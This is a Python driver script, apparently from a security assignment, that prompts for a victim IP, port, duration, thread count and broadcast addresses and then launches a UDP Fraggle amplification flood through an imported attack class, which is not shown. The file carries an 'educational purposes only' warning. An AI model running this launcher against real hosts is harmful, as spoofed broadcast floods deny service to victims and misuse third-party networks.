"""
Test script for UDP Fraggle attack implementation.

This script demonstrates the UDP Fraggle attack, which sends UDP packets
to broadcast addresses with spoofed source IP addresses, causing network
amplification that targets the victim.

Author: Security Assignment
Date: 2024
"""

import os
import sys
import time

# Add the parent directory to sys.path to handle imports from different execution contexts
current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

# Add the attack directory to sys.path
attack_dir = os.path.join(parent_dir, "attack")
if attack_dir not in sys.path:
    sys.path.insert(0, attack_dir)

try:
    from attack.udp_fraggle import UDPFraggle
except ImportError:
    from attack.udp_fraggle import UDPFraggle


def print_banner():
    """Display test banner."""
    print("=" * 80)
    print("UDP FRAGGLE ATTACK TEST")
    print("=" * 80)
    print("This test demonstrates a UDP Fraggle attack simulation.")
    print(
        "The attack sends UDP packets to broadcast addresses with spoofed source IPs."
    )
    print("This causes network amplification targeting the victim.")
    print()
    print("WARNING: This is for educational purposes only!")
    print("Run this test in a controlled environment.")
    print("=" * 80)


def get_user_input():
    """Get attack parameters from user."""
    print("\nEnter attack parameters:")

    # Target IP
    target_ip = input("Target IP address (victim) [192.168.1.100]: ").strip()
    if not target_ip:
        target_ip = "192.168.1.100"

    # Target port
    target_port_str = input("Target port [7]: ").strip()
    if not target_port_str:
        target_port = 7
    else:
        target_port = int(target_port_str)

    # Duration
    duration_str = input("Attack duration in seconds [30]: ").strip()
    if not duration_str:
        duration = 30
    else:
        duration = int(duration_str)

    # Number of threads
    threads_str = input("Number of threads [20]: ").strip()
    if not threads_str:
        threads = 20
    else:
        threads = int(threads_str)

    # Broadcast networks
    print("\nBroadcast networks (press Enter to use defaults):")
    broadcast_input = input(
        "Comma-separated broadcast IPs [192.168.1.255,10.0.0.255]: "
    ).strip()
    if broadcast_input:
        broadcast_networks = [ip.strip() for ip in broadcast_input.split(",")]
    else:
        broadcast_networks = ["192.168.1.255", "10.0.0.255", "172.16.0.255"]

    return target_ip, target_port, duration, threads, broadcast_networks


def main():
    """Main test function."""
    print_banner()

    # Get user input
    target_ip, target_port, duration, threads, broadcast_networks = get_user_input()

    # Display attack configuration
    print("\n" + "=" * 50)
    print("ATTACK CONFIGURATION")
    print("=" * 50)
    print(f"Target IP (victim): {target_ip}")
    print(f"Target Port: {target_port}")
    print(f"Duration: {duration} seconds")
    print(f"Threads: {threads}")
    print(f"Broadcast Networks: {broadcast_networks}")
    print("=" * 50)

    # Confirm attack
    confirm = input("\nProceed with the attack? (y/N): ").strip().lower()
    if confirm != "y":
        print("Attack cancelled.")
        return

    print("\nInitializing UDP Fraggle attack...")

    try:
        # Create attack instance
        attack = UDPFraggle(
            target_ip=target_ip,
            target_port=target_port,
            duration=duration,
            threads=threads,
            broadcast_networks=broadcast_networks,
        )

        print(f"\nStarting attack on {target_ip}:{target_port}...")
        print("Press Ctrl+C to stop the attack early.")

        # Start attack
        start_time = time.time()
        attack.attack()
        end_time = time.time()

        # Display results
        print("\n" + "=" * 50)
        print("ATTACK COMPLETED")
        print("=" * 50)
        print(f"Total duration: {end_time - start_time:.2f} seconds")
        print(f"Packets sent: {attack.packets_sent}")
        print(f"Average rate: {attack.packets_sent / (end_time - start_time):.2f} pps")
        print("=" * 50)

    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
    except Exception as e:
        print(f"\nError during attack: {e}")
        import traceback

        traceback.print_exc()


if __name__ == "__main__":
    main()
